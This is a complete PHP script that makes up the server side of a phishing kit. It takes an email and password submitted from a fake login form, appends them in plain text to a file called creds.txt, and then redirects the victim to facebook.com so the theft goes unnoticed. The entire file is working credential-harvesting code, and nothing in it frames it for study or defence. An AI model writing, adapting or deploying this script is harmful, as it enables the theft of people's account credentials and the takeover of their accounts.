<?php
if (isset($_POST['email']) && isset($_POST['pass'])) {
  $email = $_POST['email'];
  $pass = $_POST['pass'];
  $log = "Email: $email | Pass: $pass\n";
  file_put_contents("../../logs/creds.txt", $log, FILE_APPEND);
  header("Location: https://facebook.com");
  exit();
} else {
  echo "No credentials received.";
}
?>
